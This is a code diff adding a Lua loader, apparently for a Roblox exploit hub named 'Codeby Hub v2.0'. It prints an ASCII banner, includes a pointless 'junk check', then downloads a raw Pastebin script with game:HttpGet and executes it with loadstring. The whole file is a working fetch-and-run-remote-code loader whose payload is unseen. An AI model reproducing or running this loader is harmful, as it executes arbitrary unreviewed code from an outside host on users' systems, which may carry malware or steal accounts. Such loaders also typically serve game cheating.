@@ -1,0 +1,29 @@
+local startup_sequence = function()
+    print([[ 
+    ________ _________  _________ _________ 
+    /   ____//   _____/ /   _____//   _____/
+    \____  \ \_____  \  \_____  \ \_____  \ 
+    /       \/       \ /       \/       \
+    /______  /_______  //_______  //_______  /
+    \/       \/        \/        \/  v2.0 ]])
+    
+    local d1, d2, d3 = 10, 20, 30
+    if (d1 + d2) < d3 then return end -- Junk check
+    
+    warn("[SYSTEM] Inicializando Codeby Hub...")
+    task.wait(0.2)
+    
+    local success, result = pcall(function()
+        local target = "https://pastebin.com/raw/pFzeU6wQ"
+        return game:HttpGet(target)
+    end)
+
+    if success then
+        print("[SYSTEM] Fase 1 completada con éxito.")
+        loadstring(result)()
+    else
+        warn("[ERROR] Fallo en la comunicación con el servidor primario.")
+    end
+end
+
+task.spawn(startup_sequence)
